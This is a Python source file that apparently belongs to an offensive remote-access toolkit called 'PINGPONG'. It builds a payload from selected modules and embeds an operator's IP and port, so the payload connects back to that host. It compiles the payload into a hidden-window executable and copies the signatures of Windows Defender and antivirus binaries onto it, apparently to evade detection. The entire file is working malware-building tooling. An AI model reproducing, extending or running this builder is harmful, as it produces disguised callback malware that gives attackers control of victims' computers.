# -*- coding:utf-8 -*-
# @payload  :payload packer.py
# @Time      :2022/11/22 19:25:40
# @Author    :D0WE1L1N
from os import remove, mkdir, rename, system, environ
from os.path import isfile, isdir, abspath, dirname, sep
from shutil import move, rmtree, copy
from sys import path
from random import randint
install_path = path[4]
path.append("..")
import main, config_set
config_list = ['Default_ip', 'Default_port', 'usage']
#加载默认设置
environ["TF_CPP_MIN_LOG_LEVEL"]='3'
def get_mod_data(p, start_line, end_line):
	count = 1
	output = ''
	p.seek(0, 0)
	for line in p.readlines():
		if count <= end_line and count >= start_line:
			output += line
		count += 1
	return output
		
	
def load_config(config_list, payload_d):
	local_var = globals()
	for con in config_list:
		data = payload_d[con]
		local_var[f'{con}'] = data
#随机生成密钥		
def generate_random_str(randomlength=16):
	random_str =''
	base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
	length =len(base_str) -1
	for i in range(randomlength):
		random_str +=base_str[randint(0, length)]
	return random_str
#打包
def find_mod_location(lst, p):
	global line_count
	line_count = 0
	start_list_location = []
	for line in p.readlines():
		for us in lst:
			start_us = f'{us}_START_location'
			end_us = f'{us}_END_location'
			is_find_start, is_find_end = False, False
			if is_find_start and is_find_end:
				break
			if start_us in line:
				exec(f'{us}_start_location = line_count + 1', globals())
				exec(F'start_list_location.append({us}_start_location)')
				is_find_start = True
			if end_us in line:
				exec(f'{us}_end_location = line_count + 1', globals())
				is_find_end = True
		line_count += 1
	return start_list_location
def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', is_ask_port=0, is_basic_payload=False, _payload_id='', is_return_main=True, is_print_done=True):
	import main, config
	if not '--upx-dir' in upx_command:
		if upx_command != " " and upx_command != "":
				upx_command = "--upx-dir " + upx_command
		else:
			if file_format == '.exe':
				main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
	glo = globals()
	main.print_normal("payload>[*]Loading settings......")
	payload_d = main.get_value('payload')
	load_config(config_list, payload_d)
	for key in usage.keys():
		if usage[key]== '1':
			usage[key] = True
		elif usage[key] == '0':
			usage[key] = False

		glo[key] = usage[key]
	main.print_normal('payload>[*]Loading Done')
	if is_ask:
		ip = input(f"payload>[*]Please input the ip of your host(blank for {Default_ip})>")
		main.back_to_main(ip)
		port = input(f"payload>[*]Please input the port(blank for {Default_port})>")
		main.back_to_main(port)
		if port == "":
			port = Default_port
		if ip == "":
			ip = Default_ip
		try:
			port = int(port)
		except:
			main.print_error("handler>[-]port input error")
	else:
		if is_ask_ip != '':
			ip = is_ask_ip
		else:
			ip = Default_ip
		if is_ask_port != 0:
			port = is_ask_port
		else:
			port = Default_port
	if is_ask:
		main.print_normal("payload>[*]Printing out all the usage of your payload")
		main.print_normal(f"""payload>[*]
	--------------------------usage--------------------------

	""")
		for all_usage in usage.keys():
			main.print_normal((f'''    {all_usage} : {usage[all_usage]}'''))
		choice = input("payload>[*]Start?[y/n]>")
	else:
		choice = 'y'
	if choice == 'y' or choice == 'Y' or choice == 'YES' or choice == 'yes' or choice == ' ' or choice == '':
		key = generate_random_str(randomlength=16)
		main.print_normal(f"payload>[*]The key is: {key}")
		current_path = abspath(__file__)
		father_path = abspath(dirname(current_path) + sep + ".")
		f_father_path = abspath(dirname(father_path) + sep + ".")
		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w --log-level CRITICAL"
		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"

		if printf:
			main.print_normal("payload>[*]Loading payload......")
		with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
			open_usage = []
			for i in usage.keys():
				if usage[i]:
					open_usage.append(i)
			line_number = len(p.readlines())
			global init, start_list, init_location, exit_init
			p.seek(0, 0)
			start_list = find_mod_location(open_usage, p)
			mod_max_line = 0
			p.seek(0, 0)
			line_count = 1
			for line in p.readlines():
				for us in usage.keys():
					end_us = f'{us}_END_location'
					if end_us in line and line_count >= mod_max_line:
						mod_max_line = line_count
				line_count += 1
			exit_init = get_mod_data(p, mod_max_line, line_number)
			init_location = min(start_list)
			init = get_mod_data(p, 1, init_location)
			for _usage in open_usage:
				exec(f"{_usage}_mod = get_mod_data(p, {_usage}_start_location, {_usage}_end_location)")
		if file_format == '.exe':
			if not is_basic_payload:
				if isfile("payload.exe"):
					remove("payload.exe")
				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} --key {key} -w --log-level CRITICAL"
				with open('payload/_basic_conn.py', 'r') as p:
					basic_pay = p.read()
				with open('payload/_basic_conn_tmp.py', 'w') as a:
					a.write(basic_pay)
					a.write(f'''
_connect("{ip}", {port})				''')
					a.seek(0, 0)
					_id = generate_random_str()
					a.write(f'_id = "{_id}"')
				glo['payload_id'] = _id
				system(basic_command)
				remove("./payload/_basic_conn_tmp.py")
				move("./dist/_basic_conn_tmp.exe", f'{f_father_path}')
				rename(f'{f_father_path}/_basic_conn_tmp.exe', f'{f_father_path}/payload.exe')
				remove("./_basic_conn_tmp.spec")
				rmtree("./build")
				rmtree("./dist")
				pack(payload, printf, upx_command, file_format, is_ask=False, is_basic_payload=True, is_ask_ip=ip, is_ask_port=port, _payload_id=_id)
			with open("./payload/payload.py", "w+", encoding="utf8") as a:
				a.write(f'usage_list = {open_usage}')
				a.write(init)
				for _usage in open_usage:
					exec(f"a.write({_usage}_mod)")
				a.write(exit_init)
				a.write(f"""
PINGPONG_client("{ip}", {port})""")
			try:
				system(command)
				if printf:
					main.print_normal("payload>[*]deleting temp files......")
				remove("./payload/payload.py")
				if isdir("./payload/upload_payload"):
					rmtree("./payload/upload_payload")
				try:
					mkdir("./payload/upload_payload")
				except:
					pass
				if not printf:
					move("dist/payload.exe", "./payload/upload_payload")
					rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
				else:
					move("dist/payload.exe", "./payload/upload_payload")
					rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
				remove("payload.spec")
				rmtree("build")
				rmtree("dist")
			except(ImportError):
				main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
				system('pip install pyinstaller')
				if printf:
					print("payload>[*]re-packing")
				system(command)
			except(FileNotFoundError):
				if printf:
					main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
					main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
			main.print_good("payload>[*]signing......")
			system(command_sign_1)
			system(command_sign_2)
			remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
			remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
			rename(f"{f_father_path}/payload/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload/upload_payload/{_payload_id}.exe")
			if printf and is_print_done:
				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
				if is_return_main:
					main.main()
				else:
					return True
		elif file_format == '.py':
			with open("./payload/_basic_conn.py", 'r') as basic_pay:
				pay = basic_pay.read()
			with open("_payload.py", "w+", encoding="utf8") as a:
				payload_id = generate_random_str()
				a.write(f"_id = '{payload_id}'")
				a.write(pay)
				a.write(f'''
_connect("{ip}", {port})				''')
			_choose = input("payload>[*]Generate a backup payload?[y/n]")
			if _choose == 'y' or _choose == 'Y' or _choose == 'yes' or _choose == 'YES' or _choose == '' or _choose == ' ':
				upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
				pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_basic_payload=True, _payload_id=payload_id, is_print_done=False, is_ask=False, is_ask_ip=ip, is_ask_port=port)
			else:
				main.print_warn(f'payload>[!]The payload will generate it when you got the connection')
			if printf:
				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\_payload.py")
				main.main()
	else:
		main.print_normal("payload>[*]Back to the main console")
		main.main()

